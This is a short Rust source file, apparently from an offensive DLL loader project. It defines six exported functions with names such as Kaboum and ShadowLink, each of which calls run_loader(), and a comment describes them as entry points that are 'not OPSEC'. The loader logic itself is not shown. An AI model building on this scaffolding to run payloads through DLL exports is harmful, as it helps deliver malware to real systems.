use crate::run_loader;

// this is all entrypoint of the DLL, you should modified this to feet your need (its not OPSEC actually)

#[no_mangle]
pub extern "system" fn Kaboum() {
    run_loader();
}
#[no_mangle]
pub extern "system" fn Overlord() {
    run_loader();
}
#[no_mangle]
pub extern "system" fn ShadowLink() {
    run_loader();
}
#[no_mangle]
pub extern "system" fn Void() {
    run_loader();
}
#[no_mangle]
pub extern "system" fn MicroTech() {
    run_loader();
}
#[no_mangle]
pub extern "system" fn MiliTech() {
    run_loader();
}

